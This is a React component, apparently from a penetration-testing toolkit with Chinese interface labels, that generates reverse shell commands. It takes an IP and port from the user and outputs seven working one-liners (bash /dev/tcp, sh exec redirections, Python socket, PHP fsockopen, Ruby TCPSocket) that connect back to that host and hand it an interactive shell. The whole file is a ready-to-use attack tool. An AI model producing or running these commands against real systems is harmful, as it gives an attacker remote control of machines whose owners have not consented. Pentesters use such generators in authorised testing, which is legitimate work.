import React, { Component } from 'react'

import { Input, Divider, Button,List } from 'antd';

class Revshell extends Component {
  constructor(props) {
    super(props);
    this.state = {
      host: "127.0.0.1",
      port: "8080",
    };
  }

  changeData = (e) => {
    var data = [
      "bash -i >& /dev/tcp/" + this.state.host + "/" + this.state.port + " 0>&1",
      "exec 5<>/dev/tcp/" + this.state.host + "/" + this.state.port + ";cat <&5 | while read line; do $line 2>&5 >&5; done",
      "exec /bin/sh 0</dev/tcp/" + this.state.host + "/" + this.state.port + " 1>&0 2>&0",
      "0<&196;exec 196<>/dev/tcp/" + this.state.host + "/" + this.state.port + "; sh <&196 >&196 2>&196",
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("` + this.state.host + `",` + this.state.port + `));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      `php -r '$sock=fsockopen("` + this.state.host + `",` + this.state.port + `);exec("/bin/sh -i <&3 >&3 2>&3");'`,
      `ruby -rsocket -e'f=TCPSocket.open("`+ this.state.host +`",`+ this.state.port +`).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    ];
    this.setState({
      data: data
    })
  }

  componentWillMount(){
    this.changeData();
  }
  render() {
    return (
      <div>
        <h2>反弹shell</h2>
        <br />
         输入你要反弹的IP和端口：<br />
        <Input placeholder="ip" style={{ width: "300px" }} value={this.state.host}
          onChange={e => this.setState({ host: e.target.value })} />

        <Input placeholder="port" style={{ width: "80px" }} value={this.state.port}
          onChange={e => this.setState({ port: e.target.value })} />

        <Button type="primary" onClick={this.changeData}>生成</Button>
        <Divider orientation="left">反弹Shell</Divider>
        <List
          bordered
          dataSource={this.state.data}
          renderItem={item => (
            <List.Item>
              {/* <Typography.Text mark>[复制]</Typography.Text>  */}
              {item}
            </List.Item>
          )}
        />
      </div>
    );
  }
}

export default Revshell;